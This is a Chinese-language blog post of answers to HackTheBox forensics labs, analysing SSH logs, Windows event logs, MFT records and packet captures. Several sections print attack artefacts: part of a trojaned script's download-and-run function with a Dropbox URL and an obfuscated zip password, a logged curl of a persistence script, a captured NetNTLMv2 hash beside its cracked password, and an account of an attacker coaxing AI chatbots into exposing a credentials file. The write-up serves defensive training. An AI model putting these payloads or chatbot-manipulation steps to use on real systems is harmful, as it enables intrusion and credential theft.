---
title: hackthebox
date: '2025-05-05 09:33:16'
updated: '2025-05-08 23:55:20'
permalink: /post/hackthebox-2342kd.html
comments: true
toc: true
---



# hackthebox

## hackthebox

github

### Btutus

[Gritlog - 日志分析快人一步](https://tilipa.zlsam.com/loger/)找到一个在线查看日志的网站

1. 分析 `auth.log`，识别出攻击者用来进行暴力破解攻击的 IP 地址？

```
Mar  6 06:31:33 ip-172-31-35-28 sshd[2330]: Failed password for invalid user admin from 65.2.161.68 port 46422 ssh2
```

发现有很多这样的日志，是攻击者错误的密码，所以判断这个就是攻击者的IP地址

`65.2.161.68`

2. 暴力破解尝试成功，攻击者获得了服务器上某个账户的访问权限。这个账户的用户名是什么？

```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
```

在日志中出现IP地址的最后是这个账户登录成功

`root`

3. 你能否识别出攻击者手动登录到服务器并执行目标操作的时间戳？

这个就需要用到其中的wtmp日志，一般看到是在linux中使用last命令来查找的，但是我这边一直不行，最后使用的是

```
utmpdump wtmp
```

![](https://pic.imgdb.cn/item/6752ea51d0e0a243d4def7bf.png)

> wtmp日志是在类UNIX系统中常见的日志，这个日志记录了系统的登录和注销事件，这个日志是二进制格式的，不能直接使用文本编辑器来查看其内容
>
> 相似的还有utmp日志和btmp日志
>
> utmp日志是记录当前登录会话的信息
> btmp日志是记录失败的登录尝试

```
[7] [02549] [ts/1] [root] [pts/1] [65.2.161.68] [65.2.161.68] [2024-03-06T06:32:45,387923+00:00]
```

发现带有攻击者IP地址的记录，这个应该就是攻击者手动登录到服务器的时间

`2024-03-06 06:32:45`

4. SSH登录会话会在登录时被跟踪并分配一个会话号。问题2中提到的攻击者会话的会话号是什么？

```
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

在攻击者成功登录后有一个这个记录，确定这个就是答案

`37`

5. 攻击者作为其持久化策略的一部分，在服务器上添加了一个新用户并给予了该账户更高的权限。这个账户的名称是什么？

```
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
```

在登录成功后，发现不仅创建了这个账户，还将这个账户的权限提升了

`cyberjunkie`

6. 用于持久化的MITRE ATT&CK子技术ID是什么？

这个确实不是很熟，查看这个有两次，这次有点搞明白了，直接去查MITRE ATT&CK[Matrix - Enterprise | MITRE ATT&amp;CK®](https://attack.mitre.org/matrices/enterprise/)

在这个网站找到这个攻击者的特点，首先是持久化，然后找的是创建账户，在查询子技术，确定是本地账户

`T1136.001`

7. 根据之前确认的认证时间和auth.log中会话结束的时间，攻击者的第一个SSH会话持续了多长时间？（秒）

之前的时间是`2024-03-06 06:32:45`，最后结束会话的是`06:37:24`

```
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```

`279`

8. 攻击者登录到他们的后门账户，并利用更高的权限下载了一个脚本。使用sudo执行的完整命令是什么？

```
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

直接查找sudo命令的日志，发现账户也是后门账户，确定就是这个

`/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

### CrownJewel-1

Forela的域控制器正在受到攻击，怀疑域管理员账户已被攻破，并且可能威胁者已经在域控制器上倾倒了NTDS.dit数据库。我们刚刚收到有关在域控制器上使用vssadmin的警报，由于这不是例行的计划操作，我们有充分理由相信攻击者滥用了这个LOLBIN工具来获取域环境中的“皇冠宝石”。请对提供的证据进行快速分析并进行初步筛查，如果可能的话尽早将攻击者踢出。

1. Attackers can abuse the vssadmin utility to create volume shadow snapshots and then extract sensitive files like NTDS.dit to bypass security mechanisms. Identify the time when the **Volume Shadow Copy service** entered a running state.

> 常见的日志文件主要有三个，`System.evtx`、`Application.evtx`、`Security.evtx`
>
> * `System.evtx`：记录操作系统自身组件产生的日志事件，比如驱动、系统组件和应用软件的崩溃以及数据丢失错误
> * `Application.evtx`：记录应用程序或系统程序运行方面的日志事件，比如数据库程序可以在应用程序日志中记录文件错误、应用的崩溃记录
> * `Security.evtx`：记录系统的安全审计日志事件，比如登录事件、对象访问、进程追踪、特权调用、账号管理、策略变更等

这个应该是系统服务的事件

![](https://pic.imgdb.cn/item/6752f45ad0e0a243d4defa06.png)

搜索shadow找到，但是因为提交需要UTC时区，所以修改时区或者查看详细信息中

![](https://pic.imgdb.cn/item/6752f78bd0e0a243d4defaf6.png)

`2024-05-14 03:42:16`

2. When a volume shadow snapshot is created, the Volume shadow copy service validates the privileges using the Machine account and enumerates User groups. Find the two user groups the volume shadow copy process queries and the machine account that did it.

这个问题涉及了一个windows日志的ID，这个功能是验证权限并枚举用户组
询问AI得知事件

> `4799`:用户尝试枚举全局组成员，当用户枚举全局组的成员时会记录。

所以查找这个事件ID，同时通过查找发现Volume shadow copy service这个的核心进程是vssvc.exe，所以查找这个进程

![](https://pic.imgdb.cn/item/675500bcd0e0a243d4dfd724.png)

![](https://pic.imgdb.cn/item/675500d6d0e0a243d4dfd72c.png)

`Administrators, Backup Operators, DC01$`

3. Identify the Process ID (in Decimal) of the volume shadow copy service process.

在上一题的后面可以发现vssvc的进程ID就是0x1190，转为10进制是4496

`4496`

4. Find the assigned Volume ID/GUID value to the Shadow copy snapshot when it was mounted.

现找了一个博客[windows日志 - 小非鱼 - 博客园](https://www.cnblogs.com/feiyu99/articles/18175343)记录了很多日志文件的内容是什么找到Microsoft-Windows-NTFS.evtx有两个，都是和文件有关的，不清楚和卷的挂载是否相关

~~不管了直接开搜（~~ 
搜索shadow找到卷相关ID

![](https://pic.imgdb.cn/item/675505c3d0e0a243d4dfd7ae.png)

`{06c4a997-cca8-11ed-a90f-000c295644f9}`

5. Identify the full path of the dumped NTDS database on disk.

> 这题开始用到了$MFT文件，就记录一下
>
> MFT，全称是Master File Table，就是主文件表，是NTFS文件系统的核心，包含NTFS卷中的所有文件信息的数据库
>
> 不清楚NTFS是个啥，还是抄了一下[NTFS文件系统详解-CSDN博客](https://blog.csdn.net/tianjin_ren/article/details/127241467)orz
>
> NTFS文件系统是Windows NT家族专用的文件系统，以簇为存储单位，这个系统一共由16个元文件构成
>
> |元文件|功能|
> | --------------------------| --------------------------------------------------------------------------------|
> |$MFT|主文件表本身，是每个文件的索引|
> |$MFTMirr|主文件表的部分镜像|
> |$LogFile|事务型日志文件|
> |$Volume|卷文件，记录卷标等信息|
> |$AttrDef|属性定义列表文件|
> |$Root|根目录文件，管理根目录|
> |$Bitmap|记录每个簇的使用情况，1表示只用，0表示空闲|
> |$Boot|存储系统引导所需的信息（系统引导是计算机从关机或重启状态进入正常工作状态的过程）|
> |$BadClus|坏簇列表文件|
> |$Quota（NTFS4）|在早期的Windows NT系统中此文件为磁盘配额信息|
> |$Secure|安全文件|
> |$UpCase|大小写字符转换表文件|
> |$Extend metadata directory|扩展元数据目录（特殊的，非标准的元数据）|
> |$Extend\$Reparse|重解析点文件|
> |$Extend\$UsnJrnl|加密日志文件|
> |$Extend\$Quota|配额管理文件|
> |$Extend\$ObjId|对象ID文件|
>
> MFT文件被转为csv文件后会带有文件的信息，但是数据还在源文件中，需要从010中手拉出来

[Release v2.0.0.51 · jschicht/Mft2Csv](https://github.com/jschicht/Mft2Csv/releases/tag/v2.0.0.51)然后找到这个项目把MFT转换为csv文件

![](https://pic.imgdb.cn/item/67550a55d0e0a243d4dfd7fa.png)

选择choose $MFT 然后start就可以了

问ai找到ntds的组成有ntds.dit和日志文件和SYSVOL文件夹，所以应该就是找NTDS.dit，最后搜到

`C:\Users\Administrator\Documents\backup_sync_dc\ntds.dit`

6. When was newly dumped ntds.dit created on disk?

这个和上一题在同样的位置

7. A registry hive was also dumped alongside the NTDS database. Which registry hive was dumped and what is its file size in bytes?

这一题说注册表一起被保存了，应该就是找同一路径下的文件，直接搜backup_sync_dc\，找到有一个SYSTEM，大小随便找了后面一个数值（

`SYSTEM, 17563648`

### CrownJewel-2

---

1.When utilizing ntdsutil.exe to dump NTDS on disk, it simultaneously employs the Microsoft Shadow Copy Service. What is the most recent timestamp at which this service entered the running state, signifying the possible initiation of the NTDS dumping process?

直接查找shadow找到日志，时间

`2024-05-15 05:39:55`

2.Identify the full path of the dumped NTDS file.

一开始不知道，在瞎找ntds，找到了好几个路径，然后查看了hint，发现要在ID325中找

> ID 325的生成来源于ESENT时，通常会记录数据库的活动，所以这里才提示在这个事件ID下找

`C:\Windows\Temp\dump_tmp\Active Directory\ntds.dit`

3.When was the database dump created on the disk?

直接就是上一个问的事件

`2024-05-15 05:39:56`

4.When was the newly dumped database considered complete and ready for use?

> ID 327 当数据库引擎分离新创建的数据库并标记为可供使用时，会记录该事件ID

所以这题要筛选327事件，发现2个事件，时间是一样的

`2024-05-15 05:39:58`

5.Event logs use event sources to track events coming from different sources. Which event source provides database status data like creation and detachment?

这题前面查找ID是什么意思的时候找到了

`ESENT`

6.When ntdsutil.exe is used to dump the database, it enumerates certain user groups to validate the privileges of the account being used. Which two groups are enumerated by the ntdsutil.exe process? Give the groups in alphabetical order joined by comma space.

这题还是用户枚举，所以还是在security中搜4799

`Administrators, Backup Operators`

7.Now you are tasked to find the Login Time for the malicious Session. Using the Logon ID, find the Time when the user logon session started.

这题要写就害的理解这个环境，首先这是一个域环境

> 域环境是由域控制器管理的一种网络架构，这个域管理器就是题目中给的DC
> 域是一个逻辑分组，包括用户、解释器、其他资源（打印机）
> 域管理器是负责域内身份验证的服务器
> 而在域环境中，kerberos事件可以追踪用户的登录时间
>
> 而有关的事件
> ID 4768 是用户登录的起点
> ID 4769 是用户的服务票证请求成功
> ID 5379 是服务票证被使用

`2024-05-15 05:36:31`

### Reaper

1. What is the IP Address for Forela-Wkstn001?

流量包直接找

`172.17.79.129`

2. What is the IP Address for Forela-Wkstn002?

也是直接开搜

`172.17.79.136`

3. What is the username of the account whose hash was stolen by attacker?

在事件中找，题目描述说ip对不上，筛选4624事件，发现有一个登录事件是stn002，Ip是172.17.79.135，和前面对不上，找到这个的名字

`arthur.kyle`

4. What is the IP Address of Unknown Device used by the attacker to intercept credentials?

就是上面那个

`172.17.79.135`

5. What was the fileshare navigated by the victim user account?

这题的提示是在smb2中寻找BAD_NETWORK_NAME，查了一下发现这个是因为smb2中表示客户端请求的网络名称（文件共享名称）无效或不存在

`\\DC01\Trip`

6. What is the source port used to logon to target workstation using the compromised account?

在登录事件中也有

![](https://pic1.imgdb.cn/item/67924262d0e0a243d4f733b7.png)

`40252`

7. What is the Logon ID for the malicious session?

同上

`0x64A799`

8. The detection was based on the mismatch of hostname and the assigned IP Address.What is the workstation name and the source IP Address from which the malicious logon occur?

同上

`FORELA-WKSTN002, 172.17.79.135`

FORELA-WKSTN002, 172.17.79.135

9. At what UTC time did the the malicious logon happen?

`2024-07-31 04:55:16`

10. What is the share Name accessed as part of the authentication process by the malicious tool used by the attacker?

男泵，先找到的这个，还当前面的答案答了一次

`\\*\IPC$`

### Noxious

内部网络被入侵了，产生了LLMNR中毒流量，导向了Forela-WKstn002，其ip为172.17.79.136，发生在Active Directory VLAN 中

1. Its suspected by the security team that there was a rogue device in Forela's internal network running responder tool to perform an LLMNR Poisoning attack. Please find the malicious IP Address of the machine.

搜索llmnr流量，查到一个ip向题目ip发送了流量

> llmnr协议：
>
> 这是一种允许在没有DNS服务器的情况下，通过多播方式在本地网络中解析主机名
> 当设备需要解析一个主机名的时候，如果DNS无法使用，就会通过llmnr发送多播查询需求，局域网中的其他设备监听这些请求，如果匹配就会响应

`172.17.79.135`

2. What is the hostname of the rogue machine?

这题查找的是DHCP流量，一开始我是直接查源ip然后看的，看到这个包前面有个hostname not given我就没继续看了，结果就在后面orz

![](https://pic1.imgdb.cn/item/67930572d0e0a243d4f76802.png)

> DHCP流量：
>
> 是用来自动分配IP地址和其他网络配置参数(子网掩码、默认网关等)给网络中的设备
> 包含以下类型的信息
>
> 1. **DHCP Discover**：客户端广播消息，寻找可用的DHCP服务器。
> 2. **DHCP Offer**：DHCP服务器响应Discover消息，提供IP地址和其他配置信息。
> 3. **DHCP Request**：客户端请求使用服务器提供的IP地址。
> 4. **DHCP Acknowledge (ACK)** ：服务器确认请求，正式分配IP地址。
> 5. **DHCP Decline**：客户端拒绝提供的IP地址。
> 6. **DHCP Release**：客户端释放已分配的IP地址。
> 7. **DHCP Inform**：客户端已手动配置IP地址，仅请求其他网络配置信息。

`kali`

3. Now we need to confirm whether the attacker captured the user's hash and it is crackable!! What is the username whose hash was captured?

这里是过滤ntlmssp

> ntlmssp：
> 这是微软开发的一种身份验证协议，在windows环境中进行身份验证，是NTLM协议的一部分
>
> SMB2：
> 是用于文件共享和网络资源访问的协议
>
> 在smb2协议中，ntlmssp用户身份验证，当客户端尝试访问smb共享时，会通过ntlmssp进行身份验证，认证过程有三个步骤
> 1.Negotiate（协商）
> 客户端向服务器端发送协商信息，表明支持的NTLM版本和功能
> 2.Challenge（挑战）
> 服务器端生成一个随机数发送给客户端
> 3.Authenticate（回应）
> 客户端用用户的密码哈希对挑战进行加密，生成响应发送给客户端
> 服务器端响应验证是否正确，验证用户身份

所以找到对应ip

`john.deacon`

4. In NTLM traffic we can see that the victim credentials were relayed multiple times to the attacker's machine. When were the hashes captured the First time?

直接找前面的ntlmssp的时间

`2024-06-24 11:18:30`

5. What was the typo made by the victim when navigating to the file share that caused his credentials to be leaked?

这题不是很懂，问的是输错了什么导致被泄露

在llmnr流量中看到的是响应的DCC01，而在smb2中搜索netname，会发现响应的是DC01，所以应该是打错了这个

![](https://pic1.imgdb.cn/item/67933bb6d0e0a243d4f77972.png)

`DCC01`

6. To get the actual credentials of the victim user we need to stitch together multiple values from the ntlm negotiation packets. What is the NTLM server challenge value?

这个就是解密smb2流量的常规流程，这个找challenge

直接查ntlm server challenge就行，提交第一个

`601019d191f054f1`

7. Now doing something similar find the NTProofStr value.

同上

`c0cc803a6d9fb5a9082253a04dbd4cd4`

8. To test the password complexity, try recovering the password from the information found from packet capture. This is a crucial step as this way we can find whether the attacker was able to crack this and how quickly.

构造

```
JOHN.DEACON::FORELA:601019d191f054f1:c0cc803a6d9fb5a9082253a04dbd4cd4:010100000000000080e4d59406c6da01cc3dcfc0de9b5f2600000000020008004e0042004600590001001e00570049004e002d00360036004100530035004c003100470052005700540004003400570049004e002d00360036004100530035004c00310047005200570054002e004e004200460059002e004c004f00430041004c00030014004e004200460059002e004c004f00430041004c00050014004e004200460059002e004c004f00430041004c000700080080e4d59406c6da0106000400020000000800300030000000000000000000000000200000eb2ecbc5200a40b89ad5831abf821f4f20a2c7f352283a35600377e1f294f1c90a001000000000000000000000000000000000000900140063006900660073002f00440043004300300031000000000000000000:NotMyPassword0k?
```

`NotMyPassword0K?`

9. Just to get more context surrounding the incident, what is the actual file share that the victim was trying to navigate to?

在smb2流量中找

`\\DC01\DC-Confidential`

### Campfire-1

网络中发生了Kerberoasting攻击

> Kerberoasting攻击是针对 Kerberos 身份验证协议的攻击，通过请求服务票据来破解用户hash，获取RC4加密的票据屏保包含的账户名称
> 一般会使用RiskySPN、Mimikatz、Rubeus、Invoke-kerberoast.ps1，Metasploit，Impacket，Pypykatzd等
>
> 事件ID 4769 ：这个是请求**Kerberos 服务票据**，当用户请求票据生成这个事件

1. Analyzing Domain Controller Security Logs, can you confirm the date & time when the kerberoasting activity occurred?

这题就是要查看事件4769，发现请求的邮箱比较奇怪，并且它的加密方式是0x17，就是rc4加密，这个加密较弱，所以应该就是这个

`2024-05-21 03:18:09`

2. What is the Service Name that was targeted?

这题就在上面那个事件中

`MSSQLService`

3. It is really important to identify the Workstation from which this activity occurred. What is the IP Address of the workstation?

同上

`172.17.79.129`

4. Now that we have identified the workstation, a triage including PowerShell logs and Prefetch files are provided to you for some deeper insights so we can understand how this activity occurred on the endpoint. What is the name of the file used to Enumerate Active directory objects and possibly find Kerberoastable accounts in the network?

这个就要查看powshell的事件，随便查看4104的事件，拉到最后，就能看到

`powerview.ps1`

5. When was this script executed?

查找4104事件中最早的那个（不是创建文本的那个

`2024-05-21T03:16:32`

6. What is the full path of the tool used to perform the actual kerberoasting attack?

这里是看的9c神的博客，要使用Zimmerman的工具`PECmd`

```cmd
./PECmd -d "path to pf_files" --csv "save_csv" --csvf "result.csv"
```

看到很多文件就头大，还好是看到要找攻击程序`Rubeus.exe`

```cmd
 ./PECmd.exe -d "C:\Users\13932\Downloads\prefetch" --csv "../" --csvf "result.csv"
```

使用timeline explorer打开看csv文件

找到Rubeus.exe的位置，修改一下

\VOLUME{01d951602330db46-52233816}\USERS\ALONZO.SPIRE\DOWNLOADS\RUBEUS.EXE

`C:\Users\Alonzo.spire\Downloads\Rubeus.exe`

7. When was the tool executed to dump credentials?

就是上面那个的时间

`2024-05-21 03:18:08`

### Campfire-2

一个旧的管理员账户正在向域控制器上的KDC请求票证，这可能是一次AsREP攻击，因为任何人都可以请求任何已禁用预身份验证的用户票证

> **ASREP Roasting 攻击** 是一种针对 **Kerberos** 身份验证协议的攻击技术，攻击者通过捕获 **AS-REP** 响应并离线破解其中的用户密码哈希，从而获取对目标系统的访问权限
>
> 在Kerberos中
> 1.攻击者枚举域中未启用预认证的用户，这些账户在请求TGT时，KDC（密钥分发中心）会返回加密的AS-REP响应
> 2.攻击者再用这个账户向KDC发送AS-REQ请求，KDC返回AS-REP响应，包含用户密码哈希加密的TGT
> 3.攻击者捕获AS-REP响应，提取其中的加密部分，破解

1. When did the ASREP Roasting attack occur, and when did the attacker request the Kerberos ticket for the vulnerable user?

查找事件ID：4768，这个就是请求身份验证票据的（TGT）
找到其中有一个用户名不对，并且加密方式是RC4的

`2024-05-29 06:36:40`

2. Please confirm the User Account that was targeted by the attacker.

同上

`arthur.kyle`

3. What was the SID of the account?

同上

`S-1-5-21-3239415629-1862073780-2394361899-1601`

4. It is crucial to identify the compromised user account and the workstation responsible for this attack. Please list the internal IP address of the compromised asset to assist our threat-hunting team.

同上

`172.17.79.129`

5. We do not have any artifacts from the source machine yet. Using the same DC Security logs, can you confirm the user account used to perform the ASREP Roasting attack so we can contain the compromised account/s?

看4768的下一个事件，这个是4769事件，并且和之前的ip是一致的，看到的邮箱就是

`happy.grunwald`

### Unit42

这个要熟悉Sysomn日志和各种有用的eventid。这个实验是对UltraVNC活动进行了研究，攻击者利用后门版本的UltraVNC来保持对系统的访问
(这题电脑没有这个Sysomn日志的环境（应该是，看日志比较怪，没有格式什么的，写的蒙蒙的，完全跟着提示走)

> **UltraVNC**是一款开源的远程桌面控制软件，允许用户通过网络远程访问和控制另一台计算机

1. How many Event logs are there with Event ID 11?

筛选一下就行

`56`

2. Whenever a process is created in memory, an event with Event ID 1 is recorded with details such as command line, hashes, process path, parent process path, etc. This information is very useful for an analyst because it allows us to see all programs executed on a system, which means we can spot any malicious processes being executed. What is the malicious process that infected the victim's system?

> 每当在内存中创建一个进程时，就会记录一个事件 ID 为 1 的事件，其中包含命令行、哈希、进程路径、父进程路径等详细信息

根据提示，去找id为1 的日志，发现有一个downloads下的应用比较可疑

`C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe`

3. Which Cloud drive was used to distribute the malware?

> Event ID 22
> 这个事件是查找系统发出的DNS查询

所以这题就在可疑应用附近找22事件

`dropbox`

4. For many of the files it wrote to disk, the initial malicious file used a defense evasion technique called Time Stomping, where the file creation date is changed to make it appear older and blend in with other files. What was the timestamp changed to for the PDF file?

根据题目去找pdf

![](https://pic1.imgdb.cn/item/6795a200d0e0a243d4f8018a.png)

> 没按提示去找orz
>
> 提示给的是ID 2 这个记录系统中任何文件的创建时间变化

`2024-01-14 08:10:06`

5. The malicious file dropped a few files on disk. Where was "once.cmd" created on disk? Please answer with the full path along with the filename.

这个我也是直接找了

`C:\Users\CyberJunkie\AppData\Roaming\Photo and Fax Vn\Photo and vn 1.1.2\install\F97891C\WindowsVolume\Games\once.cmd`

6. The malicious file attempted to reach a dummy domain, most likely to check the internet connection status. What domain name did it try to connect to?

这题也是找id 22

`www.example.com`

7. Which IP address did the malicious process try to reach out to?

> id 3 ：记录ip地址、端口和尝试建立连接的进程

跟着提示走

`93.184.216.34`

8. The malicious process terminated itself after infecting the PC with a backdoored variant of UltraVNC. When did the process terminate itself?

`2024-02-14 03:41:58`

### BFT

这题也是和MFT有关的取证，会使用到MFTECmd工具解析MFT文件，并用TimeLine Explorer打开分析结果，使用hex编辑器从MFT中恢复文件

1. Simon Stark was targeted by attackers on February 13. He downloaded a ZIP file from a link received in an email. What was the name of the ZIP file he downloaded from the link?

先用工具转换一下，之前用的都是mft2csv，研究一下这个是怎么用的

```cmd
MFTECmd.exe -f "C:\Users\13932\Downloads\C\$MFT" --csv ../
```

然后查找zip文件和对应的时间

有三个压缩包，不过根据路径，看得出invoice是从这个里面解压出来的，另一个时间对不上

`Stage-20240213T093324Z-001.zip`

2. Examine the Zone Identifier contents for the initially downloaded ZIP file. This field reveals the HostUrl from where the file was downloaded, serving as a valuable Indicator of Compromise (IOC) in our investigation/analysis. What is the full Host URL from where this ZIP file was downloaded?

直接找这个字段就行

`https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser`

3. What is the full path and name of the malicious file that executed malicious code and connected to a C2 server?

确定攻击的是Stage-20240213T093324Z-001这个文件夹下的内容，搜索之后在里面查找

`C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\invoice.bat`

4. Analyze the $Created0x30 timestamp for the previously identified file. When was this file created on disk?

找这个字段就行

`2024-02-13 16:38:39`

5. Finding the hex offset of an MFT record is beneficial in many investigative scenarios. Find the hex offset of the stager file from Question 3.

* 这题学到了，在MFT记录中，找到相关条目的**entey number**，再乘1024，得到十进制，最后转为hex就行

这题的entry number是23436

`16E3000`

6. Each MFT record is 1024 bytes in size. If a file on disk has smaller size than 1024 bytes, they can be stored directly on MFT File itself. These are called MFT Resident files. During Windows File system Investigation, its crucial to look for any malicious/suspicious files that may be resident in MFT. This way we can find contents of malicious files/scripts. Find the contents of The malicious stager identified in Question3 and answer with the C2 IP and port.

> 在MFT中，每个记录大小为1024字节，如果文件小于1024字节，就会存储在MFT文件本身中，称为MFT驻留文件
>
> 使用偏移量，就可以在hex编辑器中提取出文件

这题找到偏移量，并且可以找到文件大小是286字节，跳转到偏移量，就可以找到了

![](https://pic1.imgdb.cn/item/6795ea75d0e0a243d4f80ea8.png)

`43.204.110.203:6666`

### Psittaciformes

1. What is the name of the repository utilized by the Pen Tester within Forela that resulted in the compromise of his host?

找到user的记录

```bash
git clone https://github.com/pttemplates/autoenum
cd autoenum/
ls
bash enum.sh 10.0.0.10
sudo bash enum.sh 10.0.0.10
cd 
ls
mkdir Git
cd Git/
ls
git clone https://github.com/enaqx/awesome-pentest
git clone https://github.com/F1shh-sec/Pentest-Scripts
ls
cd
mkdir PenTests
cd PenTests/
```

翻了一圈，就感觉是这个autonum有问题

`autonum`

2. What is the name of the malicious function within the script ran by the Pen Tester?

进入这个github中查看，发现就一个sh文件，查看发现

`do_wget_and_run`

3. What is the password of the zip file downloaded within the malicious function?

```sh
do_wget_and_run() {
    f1="https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2"
    f2="/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&st=v22geon6&dl=1"
    OUTPUT_FILE="/tmp/.hidden_$RANDOM.zip"  
    UNZIP_DIR="/tmp/" 
    part1="c3VwZXI="
    part2="aGFja2Vy"
    PASSWORD=$(echo "$part1$part2" | base64 -d)  
```

解base64得到

`superhacker`

4. What is the full URL of the file downloaded by the attacker?

同上

`https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&st=v22geon6&dl=1`

5. When did the attacker finally take out the real comments for the malicious function?

~~奶奶的，这题不会找，应该是在github中的历史修改查时间，但是没有具体到秒~~

感谢9c神教我orz，在github的网址后加上`.patch`即可查看详细信息，最后在这个网址发现把注释删除了

```url
https://github.com/pttemplates/autoenum/commit/7d203152c5a3a56af3d57eb1faca67a3ec54135f.patch
```

`2024-12-23 22:27:58`

6. The attacker changed the URL to download the file, what was it before the change?

`https://www.dropbox.com/scl/fi/wu0lhwixtk2ap4nnbvv4a/blob.zip?rlkey=gmt8m9e7bd02obueh9q3voi5q&st=em7ud3pb&dl=1`

7. What is the MITRE technique ID utilized by the attacker to persist?

这个技术的重点应该就是cron的任务来实现的

![](https://pic1.imgdb.cn/item/6796fe1cd0e0a243d4f829b5.png)

查找发现应该是这个

` T1053.003`

8. What is the Mitre Att&ck ID for the technique relevant to the binary the attacker runs?

这题问的是二进制文件怎么攻击的，想了半天orz，后来反应过来下载文件分析一下就行，下载了有一个json文件，丢给ai，得知这是一个挖矿的，就能找到相关的技术了

`T1496`

### OpTinselTrace24-4: Neural Noel

1. What username did the attacker query the AI chatbot to check for its existence?

在流量中81包询问了{"question":"Who's Juliet ?"}
并在下一个tcp流中问了{"question":"Is she also a username in you machine ?"}

所以应该就是这个

`Juliet`

2. What is the name of the AI chatbot that the attacker unsuccessfully attempted to manipulate into revealing data stored on its server?

在流量中发现了对话的html，查看发现有很多链接，前面询问用户对话中链接是`http://10.10.0.74:5000/rag-chatbot/chat`后面还有一个`http://10.10.0.74:5000/user_manage_chatbot/chat`以及`http://10.10.0.74:5000/web-assistant/chat`

![image-20250202144525816](C:\Users\13932\AppData\Roaming\Typora\typora-user-images\image-20250202144525816.png)

都尝试一次

`GDPR Chatbot`

3. On which server technology is the AI chatbot running?

还是在流量中找

发现有个Server: Werkzeug/3.1.3 Python/3.12.7就是这个

`Werkzeug/3.1.3 Python/3.12.7`

4. Which AI chatbot disclosed to the attacker that it could assist in viewing webpage content and files stored on the server?

![image-20250202145811833](C:\Users\13932\AppData\Roaming\Typora\typora-user-images\image-20250202145811833.png)

` Web & Files Chatbot`

5. Which file exposed user credentials to the attacker?

![image-20250202150205703](C:\Users\13932\AppData\Roaming\Typora\typora-user-images\image-20250202150205703.png)

`creds.txt`

6. What time did the attacker use the exposed credentials to log in?

他问出来的时间之后找noel

`06:49:44`

7. Which CVE was exploited by the attacker to escalate privileges?

这个在历史记录中有看到相关的，但是无法确定是什么cve

![image-20250202151046027](C:\Users\13932\AppData\Roaming\Typora\typora-user-images\image-20250202151046027.png)

询问ai也没有得到答案，查看wp得知重点是langchain 0.0.14 ，拿着这个去搜就找到了对应的cve

`CVE-2023-44467`

8. Which function in the Python library led to the exploitation of the above vulnerability?

`__import__`

9. What time did the attacker successfully execute commands with root privileges?

找到noel使用sudo命令的时候

` 06:56:41`

### Compromised

从流量中找到发生了什么以及哪些数据被窃取了

1. What is the IP address used for initial access?

查找流量，找到传入了一个gif文件，尝试了一下，54的对了

![image-20250220135530666](C:\Users\13932\AppData\Roaming\Typora\typora-user-images\image-20250220135530666.png)

`162.252.172.54`

2. What is the SHA256 hash of the malware?

将文件提取出来，用厨子加密一下

![image-20250220135923897](C:\Users\13932\AppData\Roaming\Typora\typora-user-images\image-20250220135923897.png)

`9b8ffdc8ba2b2caa485cca56a82b2dcbd251f65fb30bc88f0ac3da6704e4d3c6`

3. What is the Family label of the malware?

拉出来的文件丢到沙箱中

![image-20250220140411385](C:\Users\13932\AppData\Roaming\Typora\typora-user-images\image-20250220140411385.png)

就是`PikaBot`

4. When was the malware first seen in the wild (UTC)?

在沙箱中没看到，有个提示

```
Popular malware scanning platforms such as VirusTotal will provide this kind of data.
```

尝试使用这个工具

![image-20250220141109430](C:\Users\13932\AppData\Roaming\Typora\typora-user-images\image-20250220141109430.png)

`2023-05-19 14:01:21`

5. The malware used HTTPS traffic with a self-signed certificate. What are the ports, from smallest to largest?

这题没看懂，看的9c神的wp

查到和`HTTPS traffic`相关的默认端口是`tcp.port == 443`，但是这题好像需要更精确的，使用tls查找，因为https是基于tls运行的

使用这个筛选

```
(tls) && (ip.dst == 172.16.1.191)
```

查看源地址的端口，除了443的其他的就是

`2078, 2222, 32999`

6. What is the id-at-localityName of the self-signed certificate associated with the first malicious IP?

看9c神的博客确认第一个恶意ip是传输后的第一个

```
ip.addr == 45.85.235.39
```

找到之后查

![image-20250220143630341](C:\Users\13932\AppData\Roaming\Typora\typora-user-images\image-20250220143630341.png)

`Pyopneumopericardium`

7. What is the notBefore time(UTC) for this self-signed certificate?

在相同位置找下面的就是了

![image-20250220143842686](C:\Users\13932\AppData\Roaming\Typora\typora-user-images\image-20250220143842686.png)

8. What was the domain used for tunneling?

过滤dns找到域名

![image-20250220144231386](C:\Users\13932\AppData\Roaming\Typora\typora-user-images\image-20250220144231386.png)

`steasteel.net`
